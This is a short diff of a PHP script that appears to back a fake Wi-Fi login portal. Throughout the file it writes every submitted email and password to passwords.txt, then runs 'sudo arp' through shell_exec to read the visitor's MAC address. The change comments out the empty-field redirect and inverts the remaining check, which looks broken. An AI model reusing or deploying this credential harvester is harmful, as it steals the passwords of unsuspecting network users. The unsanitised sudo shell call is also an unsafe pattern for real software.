@@ -4,10 +4,10 @@ $email=$_POST['email'];
 $userpassword=$_POST['userpassword'];
 file_put_contents('passwords.txt', print_r($_POST, true), FILE_APPEND);
 sleep(2);
-if (empty($email | $userpassword)) {
+/*if (empty($email | $userpassword)) {
 header("location:connect.html");
-break;}
-if(!empty($email | $userpassword)) {
+break;}*/
+if(empty($email | $userpassword)) {
   $ip = $_SERVER['REMOTE_ADDR'];
   $mac = shell_exec("sudo /usr/sbin/arp -an " . $ip);
   preg_match('/..:..:..:..:..:../',$mac , $matches);
